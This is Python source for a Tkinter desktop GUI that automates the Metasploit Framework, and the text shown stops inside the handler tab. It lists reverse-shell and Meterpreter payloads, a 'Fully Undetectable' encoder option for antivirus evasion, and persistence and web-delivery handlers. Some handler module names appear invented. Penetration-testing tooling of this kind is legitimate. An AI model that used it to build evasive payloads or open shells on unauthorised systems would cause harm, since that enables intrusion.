#!/usr/bin/env python3
"""
YaP Metasploit GUI
Desktop application to automate and simplify using the Metasploit Framework.
"""

import sys
import os
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import subprocess
import queue
import re
import json
from pathlib import Path
import shutil

# Try to import PIL for icon support
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Try to import pystray for system tray support
try:
    import pystray
    HAS_PYSTRAY = True
except ImportError:
    HAS_PYSTRAY = False

# Comprehensive payload list
ALL_PAYLOADS = [
    # Windows Meterpreter
    "windows/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_http",
    "windows/meterpreter/reverse_https",
    "windows/meterpreter/reverse_dns",
    "windows/meterpreter/bind_tcp",
    "windows/meterpreter/reverse_tcp_rc4",
    "windows/meterpreter/reverse_tcp_allports",
    "windows/meterpreter/reverse_winhttp",
    "windows/meterpreter/reverse_winhttps",
    # Windows Shell
    "windows/shell/reverse_tcp",
    "windows/shell/reverse_http",
    "windows/shell/reverse_https",
    "windows/shell/bind_tcp",
    "windows/shell/reverse_tcp_rc4",
    # Linux Meterpreter
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_http",
    "linux/x86/meterpreter/reverse_https",
    "linux/x86/meterpreter/bind_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x64/meterpreter/reverse_http",
    "linux/x64/meterpreter/reverse_https",
    "linux/x64/meterpreter/bind_tcp",
    # Linux Shell
    "linux/x86/shell/reverse_tcp",
    "linux/x86/shell/reverse_http",
    "linux/x86/shell/bind_tcp",
    "linux/x64/shell/reverse_tcp",
    "linux/x64/shell/reverse_http",
    "linux/x64/shell/bind_tcp",
    # Android
    "android/meterpreter/reverse_tcp",
    "android/meterpreter/reverse_http",
    "android/meterpreter/reverse_https",
    "android/shell/reverse_tcp",
    "android/shell/reverse_http",
    # macOS
    "osx/x86/shell_reverse_tcp",
    "osx/x86/meterpreter/reverse_tcp",
    "osx/x64/meterpreter/reverse_tcp",
    # PHP
    "php/meterpreter/reverse_tcp",
    "php/shell/reverse_tcp",
    "php/bind_php",
    # Python
    "python/meterpreter/reverse_tcp",
    "python/shell/reverse_tcp",
    "python/shell_bind_tcp",
    # Java
    "java/meterpreter/reverse_tcp",
    "java/shell/reverse_tcp",
    "java/shell/bind_tcp",
    # PowerShell
    "windows/powershell/meterpreter/reverse_tcp",
    "windows/powershell/meterpreter/reverse_http",
    "windows/powershell/meterpreter/reverse_https",
    "windows/powershell/shell/reverse_tcp",
    # CMD
    "cmd/windows/powershell/meterpreter/reverse_tcp",
    "cmd/windows/powershell/shell/reverse_tcp",
    # NodeJS
    "nodejs/shell_reverse_tcp",
    "nodejs/shell_bind_tcp",
    # Ruby
    "ruby/shell_reverse_tcp",
    "ruby/shell_bind_tcp",
    # Perl
    "perl/shell_reverse_tcp",
    "perl/shell_bind_tcp",
    # Bash
    "bash/shell/reverse_tcp",
    "bash/shell/bind_tcp",
]

# Common encoders for FUD
ENCODERS = [
    "x86/shikata_ga_nai",
    "x86/fnstenv_mov",
    "x86/call4_dword_xor",
    "x86/jmp_call_additive",
    "x86/nonalpha",
    "x86/alpha_upper",
    "x86/unicode_mixed",
    "x86/unicode_upper",
    "cmd/powershell_base64",
    "generic/none",
]

# Common formats
FORMATS = [
    "raw", "exe", "elf", "dll", "so", "bin", "ps1", "vbs", "js", "py", "rb", "pl",
    "sh", "bat", "cmd", "war", "jar", "apk", "deb", "rpm", "msi", "asp", "aspx",
    "jsp", "php", "python", "ruby", "perl", "bash", "c", "csharp", "java",
    "hex", "base64", "csharp", "vbapplication", "vbs", "vba", "vbe", "psh",
    "psh-cmd", "psh-net", "psh-reflection", "hta", "js_be", "js_le", "dll",
    "macho", "osx-app", "msi-nouac", "vbs", "loop-vbs", "exe-small", "exe-only",
    "exe-service", "exe-subservice", "reflective-dll", "reflective-dll-exe",
]

class MetasploitConsole:
    """Manages Metasploit console subprocess."""
    
    def __init__(self, output_callback=None):
        self.process = None
        self.output_callback = output_callback
        self.running = False
        self.output_queue = queue.Queue()
        self.read_thread = None
        
    def start(self):
        """Start Metasploit console."""
        if self.running:
            return False
        
        try:
            msfconsole_path = self._find_msfconsole()
            if not msfconsole_path:
                raise FileNotFoundError("msfconsole not found. Please install Metasploit Framework.")
            
            # Set environment variables to suppress stty errors
            env = os.environ.copy()
            env['TERM'] = 'dumb'  # Prevent terminal control sequences
            env['COLUMNS'] = '80'
            env['LINES'] = '24'
            
            self.process = subprocess.Popen(
                [msfconsole_path, '-q'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            
            self.running = True
            
            self.read_thread = threading.Thread(target=self._read_output, daemon=True)
            self.read_thread.start()
            
            return True
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error starting Metasploit: {str(e)}\n", "error")
            return False
    
    def _find_msfconsole(self):
        """Find msfconsole executable on the system."""
        # First, try to find it in PATH (most common case)
        msfconsole_path = shutil.which('msfconsole')
        if msfconsole_path:
            return msfconsole_path
        
        # If not in PATH, check common installation locations
        common_paths = [
            '/usr/bin/msfconsole',
            '/opt/metasploit-framework/msfconsole',
            '/usr/local/bin/msfconsole',
            '/usr/share/metasploit-framework/msfconsole',
            os.path.expanduser('~/metasploit-framework/msfconsole'),
            os.path.expanduser('~/.msf4/msfconsole'),
        ]
        
        for path in common_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                return path
        
        # Check if Metasploit might be installed via package manager but not in PATH
        # Try to find it via which with full path search
        for base_path in ['/opt', '/usr', '/usr/local', os.path.expanduser('~')]:
            for root, dirs, files in os.walk(base_path):
                if 'msfconsole' in files:
                    full_path = os.path.join(root, 'msfconsole')
                    if os.access(full_path, os.X_OK):
                        return full_path
                # Don't search too deep
                if root.count(os.sep) - base_path.count(os.sep) > 3:
                    dirs[:] = []  # Don't recurse deeper
        
        return None
    
    def _read_output(self):
        """Read output from Metasploit console."""
        try:
            while self.running and self.process:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                # Filter out stty errors and other noise
                stripped = line.strip()
                
                # Skip stty error messages
                if 'stty:' in stripped.lower() and 'inappropriate ioctl' in stripped.lower():
                    continue
                
                # Skip ANSI escape sequences (like [?1034h)
                if stripped.startswith('\x1b[') or (stripped.startswith('[?') and 'h' in stripped):
                    continue
                
                # Skip empty lines and startup messages
                if not stripped or stripped.startswith('[*] Starting'):
                    continue
                
                if self.output_callback:
                    self.output_callback(line, "output")
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error reading output: {str(e)}\n", "error")
        finally:
            self.running = False
    
    def send_command(self, command):
        """Send command to Metasploit console."""
        if not self.running or not self.process:
            return False
        
        try:
            self.process.stdin.write(command + '\n')
            self.process.stdin.flush()
            return True
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error sending command: {str(e)}\n", "error")
            return False
    
    def stop(self):
        """Stop Metasploit console."""
        if not self.running:
            return
        
        self.running = False
        
        if self.process:
            try:
                self.process.stdin.write('exit\n')
                self.process.stdin.flush()
                self.process.stdin.close()
            except:
                pass
            
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass
        
        if self.read_thread:
            self.read_thread.join(timeout=1)

class MetasploitGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("YaP Metasploit GUI")
        # Optimized window size for better fit in AppImage
        self.root.geometry("1400x900")
        self.root.resizable(True, True)
        self.root.minsize(1200, 750)  # Increased minimum size to ensure everything fits
        
        self.console = None
        self.tray_icon = None
        self.tray_thread = None
        self.hidden_to_tray = False
        self.payload_save_path = os.path.expanduser("~")
        
        # Search state tracking
        self.active_search = None  # 'exploit', 'auxiliary', 'module', or None
        self.search_output_buffer = []  # Buffer to collect search output
        self.search_parsing = False  # Flag to indicate we're parsing search results
        self.is_show_command = False  # Flag to track if this is a "show" command (different format)
        self.search_timeout_id = None  # Timeout ID for processing search results
        
        self.create_widgets()
        self._set_window_icon()
        
        if HAS_PYSTRAY:
            self.setup_system_tray()
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.center_window()
    
    def _find_icon_path(self):
        """Find icon/logo path."""
        if getattr(sys, 'frozen', False):
            # PyInstaller/AppImage context
            if hasattr(sys, '_MEIPASS'):
                # PyInstaller bundle
                base_paths = [
                    sys._MEIPASS,
                    os.path.dirname(sys.executable),
                    os.path.join(os.path.dirname(sys.executable), ".."),
                ]
            else:
                # Standalone executable
                base_paths = [
                    os.path.dirname(sys.executable),
                    os.path.join(os.path.dirname(sys.executable), ".."),
                ]
            
            # For AppImage, also check the AppDir structure
            exe_dir = os.path.dirname(sys.executable)
            if "_internal" in exe_dir or "usr/bin" in exe_dir:
                # AppImage structure: check AppDir root
                appdir_root = exe_dir
                while "_internal" in appdir_root or "usr/bin" in appdir_root:
                    appdir_root = os.path.dirname(appdir_root)
                base_paths.insert(0, appdir_root)
        else:
            # Development context
            base_paths = [
                os.path.dirname(os.path.dirname(__file__)),
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                os.path.join(os.path.dirname(os.path.dirname(__file__)), ".."),
            ]
        
        icon_paths = []
        for base in base_paths:
            icon_paths.extend([
                os.path.join(base, "yapmetasploitgui250.png"),
                os.path.join(base, "icon.png"),
                os.path.join(base, "yaplab.png"),
                os.path.join(base, "yap-metasploit-gui.png"),
                # Check in common subdirectories
                os.path.join(base, "icons", "yapmetasploitgui250.png"),
                os.path.join(base, "icons", "icon.png"),
            ])
        
        for path in icon_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def _load_logo(self):
        """Load and display logo in the title frame."""
        def _load():
            try:
                icon_path = self._find_icon_path()
                if icon_path and HAS_PIL:
                    img = Image.open(icon_path)
                    # Resize to a more prominent size for display (96x96 for better visibility)
                    img = img.resize((96, 96), Image.Resampling.LANCZOS)
                    self.logo_photo = ImageTk.PhotoImage(img)
                    
                    def _display():
                        if hasattr(self, 'logo_photo') and hasattr(self, 'logo_label'):
                            # Update the existing logo label with the image
                            self.logo_label.config(image=self.logo_photo)
                            # Center the logo
                            self.logo_label.config(anchor='center')
                    self.root.after(0, _display)
                elif icon_path:
                    # If PIL is not available, try to use a simple text label
                    self.root.after(0, lambda: self.logo_label.config(text="[Logo]", font=("Segoe UI", 12)))
            except Exception as e:
                # Silently fail if logo can't be loaded
                pass
        
        threading.Thread(target=_load, daemon=True).start()
    
    def _set_window_icon(self):
        """Set the window icon for taskbar."""
        def _load_icon():
            try:
                icon_path = self._find_icon_path()
                
                if icon_path and HAS_PIL:
                    try:
                        img = Image.open(icon_path)
                        # For window icon, use a smaller size (32x32 or 48x48)
                        img = img.resize((48, 48), Image.Resampling.LANCZOS)
                        self.icon_img = ImageTk.PhotoImage(img)
                        self.root.iconphoto(True, self.icon_img)
                    except:
                        pass
            except Exception:
                pass
        
        threading.Thread(target=_load_icon, daemon=True).start()
    
    def center_window(self):
        """Center the window on the primary monitor."""
        def _center():
            self.root.update_idletasks()
            window_width = self.root.winfo_width()
            window_height = self.root.winfo_height()
            
            try:
                result = subprocess.run(['xrandr', '--query'], 
                                      capture_output=True, 
                                      text=True, 
                                      timeout=1)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'primary' in line.lower() and 'connected' in line.lower():
                            match = re.search(r'(\d+)x(\d+)\+(\d+)\+(\d+)', line)
                            if match:
                                primary_width = int(match.group(1))
                                primary_height = int(match.group(2))
                                primary_x = int(match.group(3))
                                primary_y = int(match.group(4))
                                x = primary_x + (primary_width // 2) - (window_width // 2)
                                y = primary_y + (primary_height // 2) - (window_height // 2)
                                self.root.geometry(f"+{x}+{y}")
                                return
            except:
                pass
            
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
            x = (screen_width // 2) - (window_width // 2)
            y = (screen_height // 2) - (window_height // 2)
            self.root.geometry(f"+{x}+{y}")
        
        self.root.after_idle(_center)
    
    def create_widgets(self):
        """Create GUI widgets."""
        style = ttk.Style()
        style.theme_use('clam')
        
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_frame = ttk.Frame(main_frame)
        title_frame.pack(pady=(10, 10))
        
        # Create logo label first (empty initially) so it's packed before title
        self.logo_label = ttk.Label(title_frame)
        self.logo_label.pack(pady=(0, 8))
        
        # Load and display logo image (will update the label when ready)
        self._load_logo()
        
        # Pack title and subtitle after logo
        title_label = ttk.Label(
            title_frame,
            text="YaP Metasploit GUI",
            font=("Segoe UI", 18, "bold")
        )
        title_label.pack()
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Automated Metasploit Framework Interface",
            font=("Segoe UI", 10),
            foreground="#666666"
        )
        subtitle_label.pack(pady=(4, 0))
        
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.create_console_tab()
        self.create_exploit_search_tab()
        self.create_payload_generator_tab()
        self.create_auxiliary_tab()
        self.create_handler_tab()
        self.create_session_manager_tab()
        self.create_meterpreter_tab()
        self.create_commands_tab()
        
        footer_label = ttk.Label(
            main_frame,
            text="© YaP Labs",
            font=("Segoe UI", 8),
            foreground="#999999"
        )
        footer_label.pack(side=tk.BOTTOM, pady=(10, 0))
    
    def create_console_tab(self):
        """Create the integrated Metasploit console tab."""
        console_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(console_frame, text="Metasploit Console")
        
        control_frame = ttk.Frame(console_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_btn = ttk.Button(
            control_frame,
            text="Start Console",
            command=self.start_console
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_btn = ttk.Button(
            control_frame,
            text="Stop Console",
            command=self.stop_console,
            state="disabled"
        )
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        clear_btn = ttk.Button(
            control_frame,
            text="Clear",
            command=self.clear_console
        )
        clear_btn.pack(side=tk.LEFT)
        
        output_frame = ttk.LabelFrame(console_frame, text="Console Output", padding="5")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.console_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#1e1e1e",
            fg="#d4d4d4",
            insertbackground="#d4d4d4"
        )
        self.console_output.pack(fill=tk.BOTH, expand=True)
        
        self.console_output.tag_config("output", foreground="#d4d4d4")
        self.console_output.tag_config("error", foreground="#f48771")
        self.console_output.tag_config("success", foreground="#4ec9b0")
        self.console_output.tag_config("warning", foreground="#dcdcaa")
        
        input_frame = ttk.LabelFrame(console_frame, text="Command Input", padding="5")
        input_frame.pack(fill=tk.X)
        
        input_container = ttk.Frame(input_frame)
        input_container.pack(fill=tk.X)
        
        self.command_entry = ttk.Entry(
            input_container,
            font=("Consolas", 10)
        )
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.command_entry.bind('<Return>', self.send_console_command)
        
        send_btn = ttk.Button(
            input_container,
            text="Send",
            command=self.send_console_command
        )
        send_btn.pack(side=tk.RIGHT)
        
        quick_frame = ttk.LabelFrame(console_frame, text="Quick Commands", padding="5")
        quick_frame.pack(fill=tk.X, pady=(10, 0))
        
        quick_commands = [
            ("help", "help"),
            ("version", "version"),
            ("show exploits", "show exploits"),
            ("show payloads", "show payloads"),
            ("show auxiliaries", "show auxiliaries")
        ]
        
        for i, (label, cmd) in enumerate(quick_commands):
            btn = ttk.Button(
                quick_frame,
                text=label,
                command=lambda c=cmd: self.quick_command(c),
                width=15
            )
            btn.grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky=(tk.W, tk.E))
        
        quick_frame.columnconfigure(0, weight=1)
        quick_frame.columnconfigure(1, weight=1)
        quick_frame.columnconfigure(2, weight=1)
    
    def create_exploit_search_tab(self):
        """Create exploit search tab."""
        search_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(search_frame, text="Exploit Search")
        
        search_input_frame = ttk.Frame(search_frame)
        search_input_frame.pack(fill=tk.X, pady=(0, 8))
        
        ttk.Label(search_input_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.exploit_search_entry = ttk.Entry(search_input_frame)
        self.exploit_search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.exploit_search_entry.bind('<Return>', lambda e: self.search_exploits())
        
        search_btn = ttk.Button(
            search_input_frame,
            text="Search",
            command=self.search_exploits
        )
        search_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        show_all_btn = ttk.Button(
            search_input_frame,
            text="Show All Exploits",
            command=self.show_all_exploits
        )
        show_all_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        results_frame = ttk.LabelFrame(search_frame, text="Search Results", padding="5")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        
        columns = ("Name", "Rank", "Description")
        self.exploit_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=12)
        
        for col in columns:
            self.exploit_tree.heading(col, text=col)
            self.exploit_tree.column(col, width=200)
        
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.exploit_tree.yview)
        self.exploit_tree.configure(yscrollcommand=scrollbar.set)
        
        self.exploit_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.exploit_tree.bind('<Double-1>', self.use_exploit)
        
        action_frame = ttk.Frame(search_frame)
        action_frame.pack(fill=tk.X)
        
        use_btn = ttk.Button(
            action_frame,
            text="Use Exploit",
            command=self.use_exploit
        )
        use_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        info_btn = ttk.Button(
            action_frame,
            text="Show Info",
            command=self.show_exploit_info
        )
        info_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        options_btn = ttk.Button(
            action_frame,
            text="Show Options",
            command=self.show_exploit_options
        )
        options_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        auto_setup_btn = ttk.Button(
            action_frame,
            text="Auto Setup Exploit",
            command=self.auto_setup_exploit
        )
        auto_setup_btn.pack(side=tk.LEFT)
    
    def create_payload_generator_tab(self):
        """Create payload generator tab."""
        payload_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(payload_frame, text="Payload Generator")
        
        type_frame = ttk.Frame(payload_frame)
        type_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(type_frame, text="Payload Type:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.payload_type = ttk.Combobox(
            type_frame,
            values=ALL_PAYLOADS,
            state="readonly",
            width=50
        )
        self.payload_type.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.payload_type.set("windows/meterpreter/reverse_tcp")
        
        options_frame = ttk.LabelFrame(payload_frame, text="Options", padding="10")
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        lhost_frame = ttk.Frame(options_frame)
        lhost_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lhost_frame, text="LHOST:", width=15).pack(side=tk.LEFT)
        self.lhost_entry = ttk.Entry(lhost_frame)
        self.lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.lhost_entry.insert(0, "127.0.0.1")
        
        lport_frame = ttk.Frame(options_frame)
        lport_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lport_frame, text="LPORT:", width=15).pack(side=tk.LEFT)
        self.lport_entry = ttk.Entry(lport_frame)
        self.lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.lport_entry.insert(0, "4444")
        
        format_frame = ttk.Frame(options_frame)
        format_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(format_frame, text="Format:", width=15).pack(side=tk.LEFT)
        self.format_var = tk.StringVar(value="exe")
        format_combo = ttk.Combobox(
            format_frame,
            textvariable=self.format_var,
            values=FORMATS,
            state="readonly",
            width=20
        )
        format_combo.pack(side=tk.LEFT)
        
        # FUD Options
        fud_frame = ttk.LabelFrame(payload_frame, text="FUD (Fully Undetectable) Options", padding="10")
        fud_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.fud_enabled = tk.BooleanVar(value=False)
        fud_check = ttk.Checkbutton(
            fud_frame,
            text="Enable FUD (Encoding + Iterations)",
            variable=self.fud_enabled
        )
        fud_check.pack(anchor=tk.W, pady=2)
        
        encoder_frame = ttk.Frame(fud_frame)
        encoder_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(encoder_frame, text="Encoder:", width=15).pack(side=tk.LEFT)
        self.encoder_var = tk.StringVar(value="x86/shikata_ga_nai")
        encoder_combo = ttk.Combobox(
            encoder_frame,
            textvariable=self.encoder_var,
            values=ENCODERS,
            state="readonly",
            width=30
        )
        encoder_combo.pack(side=tk.LEFT)
        
        iterations_frame = ttk.Frame(fud_frame)
        iterations_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(iterations_frame, text="Iterations:", width=15).pack(side=tk.LEFT)
        self.iterations_var = tk.StringVar(value="5")
        iterations_entry = ttk.Entry(iterations_frame, textvariable=self.iterations_var, width=10)
        iterations_entry.pack(side=tk.LEFT)
        
        ttk.Label(iterations_frame, text="(Higher = more FUD but larger size)").pack(side=tk.LEFT, padx=(5, 0))
        
        # Bad characters
        badchars_frame = ttk.Frame(fud_frame)
        badchars_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(badchars_frame, text="Bad Characters:", width=15).pack(side=tk.LEFT)
        self.badchars_entry = ttk.Entry(badchars_frame)
        self.badchars_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.badchars_entry.insert(0, "\\x00\\x0a\\x0d")
        
        # Save location
        save_frame = ttk.Frame(payload_frame)
        save_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(save_frame, text="Save Location:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.save_path_var = tk.StringVar(value=self.payload_save_path)
        save_path_entry = ttk.Entry(save_frame, textvariable=self.save_path_var, width=40)
        save_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        browse_btn = ttk.Button(
            save_frame,
            text="Browse",
            command=self.browse_save_location
        )
        browse_btn.pack(side=tk.RIGHT)
        
        # Generate button
        generate_btn = ttk.Button(
            payload_frame,
            text="Generate Payload",
            command=self.generate_payload
        )
        generate_btn.pack(pady=10)
        
        output_frame = ttk.LabelFrame(payload_frame, text="Generated Payload", padding="5")
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        self.payload_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=8
        )
        self.payload_output.pack(fill=tk.BOTH, expand=True)
        
        save_btn = ttk.Button(
            payload_frame,
            text="Save Payload to File",
            command=self.save_payload_to_file
        )
        save_btn.pack(pady=(5, 0))
    
    def create_auxiliary_tab(self):
        """Create modules tab for all module types."""
        aux_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(aux_frame, text="Modules")
        
        # Module type selection
        type_frame = ttk.LabelFrame(aux_frame, text="Module Type", padding="10")
        type_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.aux_module_type_var = tk.StringVar(value="exploit")
        module_types = [
            ("Exploits", "exploit"),
            ("Payloads", "payload"),
            ("Auxiliary", "auxiliary"),
            ("Encoders", "encoder"),
            ("NOPs", "nop"),
            ("Post", "post"),
            ("Evasion", "evasion")
        ]
        
        for i, (label, value) in enumerate(module_types):
            rb = ttk.Radiobutton(
                type_frame,
                text=label,
                variable=self.aux_module_type_var,
                value=value
            )
            rb.grid(row=i // 4, column=i % 4, padx=5, pady=2, sticky=tk.W)
        
        search_frame = ttk.Frame(aux_frame)
        search_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.aux_search_entry = ttk.Entry(search_frame)
        self.aux_search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.aux_search_entry.bind('<Return>', lambda e: self.search_auxiliary())
        
        search_btn = ttk.Button(
            search_frame,
            text="Search",
            command=self.search_auxiliary
        )
        search_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        show_all_btn = ttk.Button(
            search_frame,
            text="Show All",
            command=self.show_all_modules
        )
        show_all_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        results_frame = ttk.LabelFrame(aux_frame, text="Modules", padding="5")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ("Name", "Type", "Description")
        self.aux_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=12)
        
        for col in columns:
            self.aux_tree.heading(col, text=col)
            self.aux_tree.column(col, width=200)
        
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.aux_tree.yview)
        self.aux_tree.configure(yscrollcommand=scrollbar.set)
        
        self.aux_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.aux_tree.bind('<Double-1>', self.use_auxiliary)
        
        # Actions
        action_frame = ttk.Frame(aux_frame)
        action_frame.pack(fill=tk.X, pady=(10, 0))
        
        use_btn = ttk.Button(
            action_frame,
            text="Use Module",
            command=self.use_auxiliary
        )
        use_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        info_btn = ttk.Button(
            action_frame,
            text="Show Info",
            command=self.show_auxiliary_info
        )
        info_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        options_btn = ttk.Button(
            action_frame,
            text="Show Options",
            command=self.show_auxiliary_options
        )
        options_btn.pack(side=tk.LEFT)
    
    def create_handler_tab(self):
        """Create automated handler setup tab."""
        handler_frame = ttk.Frame(self.notebook, padding="8")
        self.notebook.add(handler_frame, text="Handler Setup")
        
        # Handler type
        type_frame = ttk.LabelFrame(handler_frame, text="Handler Configuration", padding="10")
        type_frame.pack(fill=tk.X, pady=(0, 10))
        
        handler_type_frame = ttk.Frame(type_frame)
        handler_type_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(handler_type_frame, text="Handler Type:", width=15).pack(side=tk.LEFT)
        self.handler_type_var = tk.StringVar(value="exploit/multi/handler")
        # All available Metasploit handler types
        handler_types = [
            "exploit/multi/handler",  # Standard multi-platform handler (most common)
            "exploit/windows/local/persistence",  # Windows persistence handler
            "exploit/linux/local/persistence",  # Linux persistence handler
            "exploit/unix/local/persistence",  # Unix persistence handler
            "exploit/multi/script/web_delivery",  # Web delivery handler
            "exploit/multi/script/web_delivery_psh",  # PowerShell web delivery handler
            "exploit/multi/script/web_delivery_python",  # Python web delivery handler
            "exploit/multi/script/web_delivery_jsp",  # JSP web delivery handler
            "exploit/multi/script/web_delivery_php",  # PHP web delivery handler
        ]
        handler_combo = ttk.Combobox(
            handler_type_frame,
            textvariable=self.handler_type_var,
            values=handler_types,
            state="readonly",
            width=50
        )
        handler_combo.pack(side=tk.LEFT)
        
        # Payload
        payload_frame = ttk.Frame(type_frame)
        payload_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(payload_frame, text="Payload:", width=15).pack(side=tk.LEFT)
        self.handler_payload_var = tk.StringVar(value="windows/meterpreter/reverse_tcp")
        handler_payload_combo = ttk.Combobox(
            payload_frame,
            textvariable=self.handler_payload_var,
            values=ALL_PAYLOADS,
            state="readonly",
            width=50
        )
        handler_payload_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # LHOST
        lhost_frame = ttk.Frame(type_frame)
        lhost_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lhost_frame, text="LHOST:", width=15).pack(side=tk.LEFT)
        self.handler_lhost_entry = ttk.Entry(lhost_frame)
        self.handler_lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.handler_lhost_entry.insert(0, "0.0.0.0")
        
        # LPORT
        lport_frame = ttk.Frame(type_frame)
        lport_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lport_frame, text="LPORT:", width=15).pack(side=tk.LEFT)
        self.handler_lport_entry = ttk.Entry(lport_frame)
        self.handler_lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.handler_lport_entry.insert(0, "4444")
        
        # Auto migrate
        migrate_frame = ttk.Frame(type_frame)
        migrate_frame.pack(fill=tk.X, pady=2)
        
        self.auto_migrate_var = tk.BooleanVar(value=True)
        migrate_check = ttk.Checkbutton(
            migrate_frame,
            text="Auto migrate to explorer.exe",
            variable=self.auto_migrate_var
        )
        migrate_check.pack(anchor=tk.W)
        
        # Exit on session
        exit_frame = ttk.Frame(type_frame)
        exit_frame.pack(fill=tk.X, pady=2)
        
        self.exit_on_session_var = tk.BooleanVar(value=False)
        exit_check = ttk.Checkbutton(
            exit_frame,
            text="Exit on session (for automation)",
            variable=self.exit_on_session_var
        )
        exit_check.pack(anchor=tk.W)
        
        # Buttons
        button_frame = ttk.Frame(handler_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        setup_btn = ttk.Button(
            button_frame,
            text="Setup Handler",
            command=self.setup_handler
        )
        setup_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        start_btn = ttk.Button(
            button_frame,
            text="Start Handler",
            command=self.start_handler
        )
        start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        stop_btn = ttk.Button(
            button_frame,
            text="Stop Handler",
            command=self.stop_handler
        )
        stop_btn.pack(side=tk.LEFT)
        
        # Status
        status_frame = ttk.LabelFrame(handler_frame, text="Handler Status", padding="5")
        status_frame.pack(fill=tk.BOTH, expand=True)
        
        self.handler_status = scrolledtext.ScrolledText(
            status_frame,
            wrap=tk.WORD,
